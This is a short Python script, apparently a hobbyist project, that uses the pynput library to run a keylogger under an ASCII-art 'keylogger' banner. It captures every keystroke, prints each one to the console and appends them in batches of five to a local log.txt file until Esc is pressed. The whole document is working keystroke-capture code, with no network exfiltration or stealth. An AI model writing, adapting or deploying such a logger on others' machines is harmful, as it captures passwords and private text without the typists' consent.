import pynput
import time
from pynput.keyboard import Key,Listener

count = 0
keys = []


print(" _           _ ")
time.sleep(0.5)
print("| |_ ___ _ _| |___ ___ ___ ___ ___ ")
time.sleep(0.5)
print("| '_| -_| | | | . | . | . | -_|  _| ")
time.sleep(0.5)
print("|_,_|___|_  |_|___|_  |_  |___|_| ")
time.sleep(0.5)
print("        |___|     |___|___| ")
time.sleep(1)

def on_key_press(key):
    global count, keys
    keys.append(key)
    count += 1
    if count >= 5:
        count = 0
        write_file(keys)
        keys = []

    print(key)

def write_file(keys):
    with open("log.txt", "a+") as file:
        for key in keys:
            k = str(key).replace("'", "")
            if "space" in k:
                file.write("\n")
            elif not "key" in k:
                file.write(str(k))

def on_key_release(key):
    if key == Key.esc:
        return False




with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()
